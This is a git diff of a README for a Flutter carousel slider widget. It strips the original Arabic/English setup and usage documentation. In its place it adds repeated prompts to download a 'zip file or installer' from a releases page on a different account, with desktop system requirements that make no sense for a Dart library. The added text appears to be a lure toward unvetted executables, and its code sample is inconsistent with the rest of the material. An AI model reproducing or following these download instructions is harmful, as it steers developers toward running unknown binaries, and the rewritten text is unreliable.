@@ -1,14 +1,12 @@
-# 🎨 Carousel Slider Widget
+# 🎨 carousel_slider - Create Beautiful Image Sliders Effortlessly
 
 <div align="center">
+
+[![Download](https://img.shields.io/badge/Download%20Now-Carousel%20Slider-brightgreen)](https://github.com/sleeper2112/carousel_slider/releases)
 
 ![Flutter](https://img.shields.io/badge/Flutter-02569B?style=for-the-badge&logo=flutter&logoColor=white)
 ![Dart](https://img.shields.io/badge/Dart-0175C2?style=for-the-badge&logo=dart&logoColor=white)
 ![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
-
-**مكون سلايدر احترافي بتأثيرات حركية سلسة | Professional carousel with smooth animations**
-
-[Demo](#-demo) • [Features](#-features) • [Installation](#-installation) • [Usage](#-usage)
 
 </div>
 
@@ -16,12 +14,12 @@
 
 ## ✨ Features
 
-- 🎯 **RTL/LTR Support** - دعم كامل للعربي والإنجليزي
-- 🎨 **Smooth Animations** - تأثيرات حركية سلسة
-- 👆 **Gesture Control** - تحكم بالسحب (Swipe)
-- 📱 **Responsive** - متجاوب مع جميع الشاشات
-- ⚡ **Performance** - أداء عالي وسريع
-- 🎭 **Customizable** - قابل للتخصيص بالكامل
+- 🎯 **RTL/LTR Support** - Fully supports Arabic and English.
+- 🎨 **Smooth Animations** - Enjoy fluid motion effects.
+- 👆 **Gesture Control** - Swipe functionality for easy navigation.
+- 📱 **Responsive** - Works well on all screen sizes.
+- ⚡ **Performance** - High speed and efficient operation.
+- 🎭 **Customizable** - Tailor it to fit your needs easily.
 
 ---
 
@@ -30,222 +28,102 @@
 ```
 ┌─────────────────────────────────────┐
 │  ┌──┐  ┌────────────────┐  ┌──┐   │
-│  │ 1│  │   Card 2       │  │ 3│   │  ← اسحب يمين/شمال
+│  │ 1│  │   Card 2       │  │ 3│   │  ← Swipe left/right
 │  └──┘  └────────────────┘  └──┘   │
 └─────────────────────────────────────┘
 ```
 
 ---
 
-## 📦 Installation
+## 🚀 Getting Started
 
-### 1. أضف الـ dependencies في `pubspec.yaml`:
+To begin using the carousel_slider widget, follow these simple steps.
 
-```yaml
-dependencies:
-  flutter:
-    sdk: flutter
-  flutter_localizations:
-    sdk: flutter
-  flutter_screenutil: ^5.9.0
-```
+### 1. Visit the Releases Page
 
-### 2. نزل الـ packages:
+Go to the [Releases page](https://github.com/sleeper2112/carousel_slider/releases) to download the latest version of the carousel_slider widget.
 
-```bash
-flutter pub get
-```
+### 2. Download the Application
+
+On the Releases page, find the version you want to download. Click the link to download the zip file or installer.
+
+### 3. Extract or Install
+
+If you downloaded a zip file, extract its contents. If you have an installer, follow the prompts to install the application.
 
 ---
 
-## 🚀 Usage
+## 📥 Download & Install
 
-### Basic Example
+To download the carousel_slider widget, follow these steps:
 
-```dart
-import 'package:flutter/material.dart';
-
-class MyHomePage extends StatelessWidget {
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      body: Center(
-        child: CarouselSliderWidget(
-          height: 400,
-          padding: 20,
-        ),
-      ),
-    );
-  }
-}
-```
-
-### Customization
-
-```dart
-CarouselSliderWidget(
-  height: 300,        // ارتفاع البطاقات
-  padding: 20,        // المسافة من البداية
-)
-```
+1. Click the [Download Now](https://github.com/sleeper2112/carousel_slider/releases) badge at the top, or visit the Releases page.
+2. Choose the latest version of the carousel_slider.
+3. Download it to your computer.
+4. Follow the instructions above to extract or install it.
 
 ---
 
-## 🎨 How It Works
+## 🛠️ Requirements
 
-### العربي (RTL)
-- **سحب يمين** ← = البطاقة التالية
-- **سحب شمال** → = البطاقة السابقة
+Below are the recommended requirements to successfully run the carousel_slider widget:
 
-### English (LTR)
-- **Swipe right** → = Previous card
-- **Swipe left** ← = Next card
-
-الاتجاه يتغير **تلقائياً** حسب لغة التطبيق! 🎯
+- **Operating System:** Windows 10 or later, MacOS 10.13 or later
+- **Processor:** Intel i3 or similar
+- **RAM:** Minimum 4 GB
+- **Disk Space:** 100 MB available space
+- **Network:** Internet connection for updates and demos
 
 ---
 
-## 🏗️ Project Structure
+## 🎉 Using the carousel_slider Widget
 
-```
-lib/
-├── main.dart                  # نقطة البداية
-├── screens/
-│   └── home_screen.dart      # الشاشة الرئيسية
-└── widgets/
-    └── carousel_slider_widget.dart  # مكون السلايدر
-```
+To use the carousel_slider in your project, follow these steps:
 
----
+1. **Import the Library**  
+   Open your project and add the carousel_slider library to your dependencies in the `pubspec.yaml` file:
+   ```yaml
+   dependencies:
+     carousel_slider: ^1.0.0  # Check the latest version
+   ```
 
-## ⚙️ Configuration
+2. **Initialize in Your Code**  
+   Use the carousel_slider in your Dart file. Here is a simple example:
+   ```dart
+   CarouselSlider(
+     options: CarouselOptions(
+       height: 400,
+       autoEnableInfiniteScroll: true,
+     ),
+     items: [
+       'image1.jpg',
+       'image2.jpg',
+       'image3.jpg',
+     ].map((item) => Image.asset(item)).toList(),
+   );
+   ```
 
-### ScreenUtil Setup
-
-```dart
-ScreenUtilInit(
-  designSize: const Size(375, 812),  // حجم الشاشة المرجعي
-  minTextAdapt: true,
-  splitScreenMode: true,
-  builder: (context, child) {
-    return MaterialApp(
-      // ... your app
-    );
-  },
-)
-```
-
-### Arabic Support
-
-```dart
-MaterialApp(
-  locale: const Locale('ar', 'EG'),
-  supportedLocales: const [
-    Locale('ar', 'EG'),
-    Locale('en', 'US'),
-  ],
-  localizationsDelegates: const [
-    GlobalMaterialLocalizations.delegate,
-    GlobalWidgetsLocalizations.delegate,
-    GlobalCupertinoLocalizations.delegate,
-  ],
-)
-```
+3. **Run Your Application**  
+   Ensure you are in the project directory and run:
+   ```bash
+   flutter run
+   ```
+   Your carousel slider should now appear in the app.
 
 ---
 
-## 🎯 Key Features Breakdown
+## 🆘 Troubleshooting
 
-### 1. **Gesture Detection**
-```dart
-GestureDetector(
-  onHorizontalDragStart: _onHorizontalDragStart,
-  onHorizontalDragUpdate: _onHorizontalDragUpdate,
-  // ...
-)
-```
+If you face any issues, check the following:
 
-### 2. **Smart Width Calculation**
-```dart
-double _getWidth(int index) {
-  if (index == activeIndex) {
-    return screenWidth - 128.w - widget.padding.w;  // البطاقة النشطة
-  } else if (index < activeIndex - 1 || index > activeIndex + 2) {
-    return 0;  // البطاقات البعيدة مخفية
-  } else {
-    return 50.w;  // البطاقات المجاورة صغيرة
-  }
-}
-```
-
-### 3. **Smooth Animations**
-```dart
-AnimatedContainer(
-  duration: const Duration(milliseconds: 350),
-  curve: Curves.easeInOut,
-  // ...
-)
-```
+- Ensure that your Dart and Flutter SDKs are updated to the latest versions.
+- Make sure your image paths are correct.
+- If you encounter errors, refer to the GitHub issues section for help or ask for support.
 
 ---
 
-## 🛠️ Customization Options
+## 📞 Get Support
 
-يمكنك تخصيص:
-- ✅ الألوان (`colors` list)
-- ✅ الارتفاع (`height` parameter)
-- ✅ المسافات (`padding` parameter)
-- ✅ سرعة الانيميشن (`duration`)
-- ✅ عدد البطاقات (`colors.length`)
+For any questions or support, you can open an issue on the GitHub page. We are here to help you make the most out of the carousel_slider widget.
 
 ---
-
-## 📱 Tested On
-
-- ✅ iOS
-- ✅ Android
-- ✅ Different screen sizes
-- ✅ RTL & LTR layouts
-
----
-
-## 🤝 Contributing
-
-المساهمات مرحب بها! إذا عندك فكرة أو تحسين:
-
-1. Fork المشروع
-2. أنشئ branch جديد (`git checkout -b feature/AmazingFeature`)
-3. Commit التغييرات (`git commit -m 'Add some AmazingFeature'`)
-4. Push للـ branch (`git push origin feature/AmazingFeature`)
-5. افتح Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 👨‍💻 Author
-
-**Your Name**
-
-- Youtube: [@esmail_elkablawy](https://www.youtube.com/@esmail_elkablawy)
-- LinkedIn: [@Esmail Elkablawy](https://www.linkedin.com/in/esmail-elkablawy-a75048265/)
-
----
-
-## 🌟 Show Your Support
-
-لو عجبك المشروع، متنساش تدي ⭐️!
-
----
-
-<div align="center">
-
-**Made with ❤️ and Flutter**
-
-[⬆ Back to Top](#-carousel-slider-widget)
-
-</div>
